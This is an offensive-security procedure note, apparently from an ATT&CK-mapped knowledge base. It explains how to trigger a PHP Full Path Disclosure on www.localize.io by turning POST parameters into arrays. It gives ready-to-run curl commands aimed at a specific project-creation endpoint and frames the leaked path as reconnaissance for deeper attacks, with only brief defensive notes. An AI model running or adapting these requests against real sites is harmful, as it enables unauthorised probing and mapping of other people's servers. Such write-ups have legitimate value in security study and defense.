---
id: proc-fpd-array-manip-001
tags:
  - fpd
  - information-disclosure
  - php-error
  - parameter-manipulation
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-get-project-creation]]'
  - '[[commands/curl-post-fpd-trigger]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:06.229Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-FPD-with-Array-Parameter-Manipulation

## Summary

This procedure exploits a Full Path Disclosure vulnerability in PHP-based web applications like www.localize.io by appending '[]' to POST parameters, converting scalars to arrays and causing the trim() function to fail with a warning that reveals the server's internal file path.

## Description

The vulnerability arises from the application code in /classes/UI.php (line 1495) expecting string inputs for trim() but receiving arrays due to manipulated form data. This triggers a PHP notice or warning that includes the absolute path to the script file. The attack requires access to a form endpoint, such as project creation, and knowledge of parameter names. Expected outcomes include disclosure of paths like /var/www/... , aiding in filesystem mapping for further attacks like path traversal. Prerequisites include a valid CSRF token and endpoint details.

## Requirements

1. Network access to the target web application (e.g., http://www.localize.io).
2. curl or similar HTTP client for requests.
3. Extracted CSRF token from the initial GET request.
4. Knowledge of form parameters (e.g., project ID 72, language ID 1).

## Defense

Defensive measures and detection strategies:

- Input validation: Ensure parameters are treated as strings and sanitize array inputs.
- Error handling: Suppress or log PHP warnings without exposing paths (use error_reporting(0) in production).
- Web Application Firewall (WAF): Detect anomalous parameter patterns like '[]' in POST data.
- Monitoring: Log and alert on PHP warnings or errors in application logs.

## Objectives

1. Trigger a PHP error to disclose the full server file path.
2. Map the target's filesystem structure for reconnaissance.
3. Identify potential entry points for deeper exploitation.

## Instructions

### Step 1: Access the Form Endpoint

**Context**: Fetch the project creation page to obtain the CSRF token and verify endpoint accessibility.

**Command** ([[commands/curl-get-project-creation]]):
```bash
curl -X GET "http://www.localize.io/pages/create_project/72" -o project_form.html
```

> This command retrieves the HTML form. Inspect project_form.html for the CSRFToken value, typically in a hidden input field. Expected output is the full HTML response with form elements.

### Step 2: Submit Manipulated POST Request

**Context**: Append '[]' to vulnerable parameters (e.g., name and editRepositoryID) to force array interpretation, triggering the trim() error on non-string input.

**Command** ([[commands/curl-post-fpd-trigger]]):
```bash
curl -X POST "http://www.localize.io/pages/create_project/72" \
  -d "CSRFToken=TOKEN VALUE" \
  -d "create_project[visibility]=1" \
  -d "create_project[name][]=My+Android" \
  -d "create_project[defaultLanguage]=1" \
  -d "create_project[editRepositoryID][]=72"
```

> Replace TOKEN VALUE with the actual CSRF token. This sends the POST data, causing PHP to warn about trim() on an array. Expected output includes a PHP warning like "Warning: trim() expects parameter 1 to be string, array given in /var/www/.../UI.php on line 1495", disclosing the path.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-get-project-creation]]
- [[commands/curl-post-fpd-trigger]]

## Tools Used

- [[tools/curl]]

## Tags

- [[fpd]]
- [[information-disclosure]]
- [[php]]
- [[web]]
